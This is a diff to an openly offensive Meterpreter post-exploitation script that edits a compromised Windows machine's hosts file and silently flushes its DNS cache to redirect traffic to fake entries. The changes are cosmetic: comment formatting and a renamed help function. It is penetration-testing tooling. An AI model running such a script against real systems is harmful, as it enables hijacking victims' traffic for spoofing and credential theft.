@@ -1,21 +1,34 @@
 # $Id:$
-#Meterpreter script for modifying the hosts file in windows
-#given a single entrie or several in a file and clear the 
-#DNS cache on the target machine.
-#This script works with Windows 2000,Windows XP,Windows 2003,
-#Windows Vista and Windows 2008.
-#Provided: carlos_perez[at]darkoperator[dot]com
-#Verion: 0.1.0
-#Note: in Vista UAC must be disabled to be able to perform hosts
-#file modifications.
+# Meterpreter script for modifying the hosts file in windows
+# given a single entrie or several in a file and clear the 
+# DNS cache on the target machine.
+# This script works with Windows 2000,Windows XP,Windows 2003,
+# Windows Vista and Windows 2008.
+# Provided: carlos_perez[at]darkoperator[dot]com
+# Version: 0.1.0
+# Note: in Vista UAC must be disabled to be able to perform hosts
+# file modifications.
 ################## Variable Declarations ##################
 session = client
 # Setting Arguments
 @@exec_opts = Rex::Parser::Arguments.new(
-	"-h" => [ false,"Help Options."                        ],
-	"-e" => [ true,"Host entry in the format of IP,Hostname."],
-	"-l" => [ true,"Text file with list of entries in the format of IP,Hostname. One per line."]
+	"-h" => [ false, "Help Options." ],
+	"-e" => [ true,  "Host entry in the format of IP,Hostname." ],
+	"-l" => [ true,  "Text file with list of entries in the format of IP,Hostname. One per line." ]
 )
+def usage
+	print_line("This Meterpreter script is for adding entries in to the Windows Hosts file.")
+	print_line("Since Windows will check first the Hosts file instead of the configured DNS Server")
+	print_line("it will assist in diverting traffic to the fake entry or entries. Either a single")
+	print_line("entry can be provided or a series of entries provided a file with one per line.")
+	print_line(@@exec_opts.usage)
+	print_line("Example:\n\n")
+	print_line("run hostsedit -e 127.0.0.1,google.com\n")
+	print_line("run hostsedit -l /tmp/fakednsentries.txt\n\n")
+	raise Rex::Script::Completed
+end
+
+
 record = ""
 #Set path to the hosts file
 hosts = session.fs.file.expand_path("%SYSTEMROOT%")+"\\System32\\drivers\\etc\\hosts"
@@ -54,17 +67,6 @@ def cleardnscach(session)
 	print_status("Clearing the DNS Cache")
 	session.sys.process.execute("cmd /c ipconfig /flushdns",nil, {'Hidden' => true})
 end
-#Help Message
-def helpmsg
-	puts "This Meterpreter script is for adding entries in to the Windows Hosts file."
-	puts "Since Windows will check first the Hosts file instead of the configured DNS Server"
-	puts "it will assist in diverting traffic to the fake entry or entries. Either a single"
-	puts "entry can be provided or a series of entries provided a file with one per line."
-	puts @@exec_opts.usage
-	puts "Example:\n\n"
-	puts "run hostsedit -e 127.0.0.1,google.com\n"
-	puts "run hostsedit -l /tmp/fakednsentries.txt\n\n"
-end
 
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
@@ -77,17 +79,17 @@ end
 		checkuac(session)
 		if not ::File.exists?(val)
 			raise "File #{val} does not exists!"
-	       	else
+		else
 			backuphosts(session,hosts)
-	    		::File.open(val, "r").each_line do |line|
+				::File.open(val, "r").each_line do |line|
 				add2hosts(session,line.chomp,hosts)
 			end
 			cleardnscach(session)
 		end
 	when "-h"
-		helpmsg
+		usage
 	end
 }
 if args.length == 0
-	helpmsg
+	usage
 end
